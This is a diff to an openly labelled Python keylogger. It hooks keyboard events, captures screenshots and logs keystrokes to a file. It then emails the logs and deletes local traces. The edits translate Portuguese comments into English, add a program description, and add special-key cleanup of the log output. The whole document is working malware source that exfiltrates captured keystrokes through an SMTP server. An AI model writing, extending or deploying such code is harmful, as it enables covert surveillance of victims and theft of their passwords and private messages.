@@ -47,7 +47,7 @@ else:
   from email.utils import COMMASPACE, formatdate  
 
 #arguments
-parser = args.ArgumentParser()
+parser = args.ArgumentParser(description="The basic keylogger that use smtp use -e and -p to the program work perfect")
 parser.add_argument("-e", "--email",required=True,help="Your email to send the logs")
 parser.add_argument("-p", "--password",required=True,help="Your password to the program send the logs")
 parser.add_argument("-l", "--local",required=False,type=str,default="/tmp/logs.txt",help="the place where do you will put the logs")
@@ -59,12 +59,12 @@ parsed_args = parser.parse_args()
 
 data_hora = datetime.datetime.now()
 data_hora = str(data_hora).split('.')[0].replace(' ','_')###
-sendTo = parsed_args.email #para onde você ira enviar o arquivo
+sendTo = parsed_args.email #for where you'll send the archive
 assunto = 'Keylogger %s' %data_hora
-mensagem = ' the keylogger dumped it %s '%data_hora #mensagem é também pega a data é a hora do pc 
+mensagem = ' the keylogger dumped it %s '%data_hora #mensage and take the hour on pc 
 youremail = parsed_args.email
 password = parsed_args.password
-server= 'smtp.gmail.com' #o servidor pode ser do gmail dentre outros
+server= 'smtp.gmail.com' #it is a server of google to receve the email more do you can change that to other
 port = 587
 sendtime = parsed_args.time
 log_file = parsed_args.local
@@ -110,8 +110,7 @@ def screenshot():
         send_Image(dic)
         os.remove(dic)
      
-
-#essa funão gerencia cria os heards dentre outras coisas 
+#this function manager and create the heards among other things 
 def send_email(server, port, FROM, PASS, TO, subject, texto, anexo=[]):
   global exit 
   server = server
@@ -154,9 +153,49 @@ try:
     def OnKeyPress(event): #essa função pega as teclas que foram precionadas
       fob=open(log_file,'a')
       fob.write(event.Key)
-      fob.write('\n')
 
-      if event.Ascii==59: #59 se esse valor e representado por ; se for precionada ele ira parar o keylogger e ira mandar o email
+      #this values is to let the output more clean
+      #backspace value
+      if event.Ascii == 8:
+        fob.write("\b\b\b\b\b\b\b\b\b\040")
+      #tab value
+      elif event.Ascii == 9:
+        fob.write("\b\b\b\040")
+      #enter value
+      elif event.Ascii == 13:
+        fob.write("\b\b\b\b\b\b\040")
+      #this is a space value
+      elif event.Ascii == 32:
+        fob.write("\b\b\b\b\b\040")  
+      #left arrow
+      elif event.Ascii == 81:
+        fob.write("\b\b\b\b\040")
+      #up arrow
+      elif event.Ascii == 82:
+        fob.write("\b\b\040")
+      #right arrow
+      elif event.Ascii == 83:
+        fob.write("\b\b\b\b\040")
+      #down arrow
+      elif event.Ascii == 84:
+        fob.write("\b\b\b\b\040")      
+      #shift_l value
+      elif event.Ascii == 225:
+        fob.write("\b\b\b\b\b\b\b\b\040")
+      #shift_r value
+      elif event.Ascii == 226:
+        fob.write("\b\b\b\b\b\b\b\b\040")
+      #control_l value
+      elif event.Ascii == 227:
+        fob.write("\b\b\b\b\b\b\b\b\b\040")
+      #control_r value  
+      elif event.Ascii == 228:
+        fob.write("\b\b\b\b\b\b\b\b\040")
+      #delete value
+      elif event.Ascii == 229:
+        fob.write("\b\b\b\b\b\b\b\b\040")  
+
+      elif event.Ascii==59: #59 this value is represented for ; if this key pressed it'll stop the keylogger and will send the email
         fob.close()
         new_hook.cancel()
         send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
@@ -180,7 +219,7 @@ try:
         send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
         os.remove(log_file)
         exit(1)
-          
+
     hooks_manager = pyHook.HookManager()
     hooks_manager.KeyDown = OnKeyboardEvent
     hooks_manager.HookKeyboard()
